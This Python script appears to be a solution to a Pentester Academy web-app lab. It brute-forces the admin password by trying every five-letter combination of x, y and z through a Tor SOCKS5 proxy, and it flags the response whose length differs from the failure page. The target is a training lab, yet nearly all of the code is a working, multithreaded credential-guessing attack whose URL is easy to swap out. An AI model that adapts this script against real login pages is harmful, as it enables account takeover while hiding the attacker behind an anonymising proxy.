import itertools 
import time
from  threading import Thread
from queue import Queue 
#import certifi
#import urllib3
from urllib3.contrib.socks import SOCKSProxyManager

class ThreadUrl(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue
        
    def run(self) :
        while not self.queue.empty() :
            work = self.queue.get()
            http = SOCKSProxyManager('socks5://127.0.0.1:9150')
#            http = urllib3.PoolManager(cert_reqs ='CERT_REQUIRED',ca_certs=certifi.where())
            try:
                httpResponse = http.request('GET', baseUrl + work)
            except :
                print("Error")
            if len(httpResponse.data) != 4118:
                print(f'---------------------------------------------------------------------------------------------')
                print(f'-******************************************************************************************- ')
                print(f'-*************************** {work} Is what you want **************************************- ')
                print(f'-******************************************************************************************- ')
                print(f'---------------------------------------------------------------------------------------------')
                print("--- %s seconds ---" % (time.time() - start_time))
                self.queue.task_done()
                break
            else:
                self.queue.task_done()
                                
start_time = time.time()
baseUrl = 'https://pentesteracademylab.appspot.com/lab/webapp/1?email=admin%40PentesterAcademy.com&password='
Args = 'xtzxy'
print("Start Processing") 
request_queue = Queue()

def main():
    letters = itertools.product(['x', 'y', 'z'],repeat=int(5))
    for i in letters:
        x = "".join(i)
        request_queue.put(x)
        worker = ThreadUrl(request_queue)
        worker.setDaemon(True)
        worker.start()
main()



  



